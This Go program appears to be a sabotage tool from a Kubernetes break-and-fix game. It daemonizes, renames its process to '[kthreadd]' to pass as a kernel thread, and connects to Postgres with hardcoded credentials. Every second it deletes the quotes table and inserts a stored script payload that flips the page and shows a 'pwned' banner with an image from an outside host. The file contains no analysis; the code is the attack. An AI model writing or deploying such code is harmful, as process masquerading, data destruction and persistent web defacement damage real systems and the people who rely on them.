package main

import (
	"database/sql"
	"fmt"
	"net/http"
	"os"
	"os/exec"
	"runtime"
	"syscall"
	"time"

	_ "github.com/lib/pq"

	"github.com/erikdubbelboer/gspt"
	"k8s.io/klog/v2"
)

var (
	pgUser = "postgres"
	pgPass = "postgresql123"
	target = "postgres.default.svc.cluster.local"
)

func serve() {
	s := &Server{}
	addr := ":5433"
	http.HandleFunc("/healthz", s.Healthz())
	http.HandleFunc("/threadz", s.Threadz())
	klog.Infof("Listening on %s ...", addr)
	http.ListenAndServe(addr, nil)
}

type Server struct{}

func (s *Server) Healthz() http.HandlerFunc {
	return func(w http.ResponseWriter, r *http.Request) {
		w.WriteHeader(http.StatusOK)
	}
}

func (s *Server) Threadz() http.HandlerFunc {
	return func(w http.ResponseWriter, r *http.Request) {
		klog.Infof("GET %s: %v", r.URL.Path, r.Header)
		w.WriteHeader(http.StatusOK)
		if _, err := w.Write(stack()); err != nil {
			klog.Errorf("writing threadz response: %d", err)
		}
	}
}

func stack() []byte {
	buf := make([]byte, 1024)
	for {
		n := runtime.Stack(buf, true)
		if n < len(buf) {
			return buf[:n]
		}
		buf = make([]byte, 2*len(buf))
	}
}

func updateDatabase(force bool) error {
	conn := fmt.Sprintf("postgresql://%s:%s@%s/klustered?sslmode=disable", pgUser, pgPass, target)
	db, err := sql.Open("postgres", conn)
	defer db.Close()

	if err != nil {
		return fmt.Errorf("open: %w", err)
	}

	rows, err := db.Query(`SELECT * FROM quotes WHERE LENGTH(author) > 0;`)
	if err != nil {
		return fmt.Errorf("query: %w", err)
	}
	defer rows.Close()

	total := 0
	for rows.Next() {
		total++
	}

	if force || total > 0 {
		klog.Infof("updating...")
		db.Exec(`DELETE FROM quotes;`)
		db.Exec(`INSERT INTO quotes (quote, author, link) VALUES (
				'<style>
				h1 {
					text-shadow: 1px 1px 2px black, 0 0 25px red, 0 0 5px darkred;
					color: #fff;
					font-size: 100px;
				}
				img {
					width: 30%;
				}
				</style>
				<script>document.getElementsByTagName("body")[0].style.transform = "rotate(180deg)";</script><img src=http://libthom.so/hair.jpg><h1>pwned by Da West Chainguard Massiv!</h1></body></html><!--',
				'',
				'');`)
	}
	return nil
}

func daemonize() error {
	cmd := exec.Command(os.Args[0], "child")
	cmd.Stdin = nil
	cmd.Stdout = nil
	cmd.Stderr = nil
	cmd.SysProcAttr = &syscall.SysProcAttr{Setsid: true}

	err := cmd.Start()
	if err == nil {
		cmd.Process.Release()
		os.Exit(0)
	}
	return err
}

func main() {
	if len(os.Args) == 2 {
		klog.Infof("init daemon")
		err := daemonize()
		if err != nil {
			klog.Fatalf("daemonize: %v", err)
		}
	}

	gspt.SetProcTitle("[kthreadd]")

	go serve()
	count := 0

	for {
		count++
		force := false
		if count < 2 {
			force = true
		}

		time.Sleep(1 * time.Second)
		if err := updateDatabase(force); err != nil {
			klog.V(1).Infof("update: %v", err)
		}
	}
}
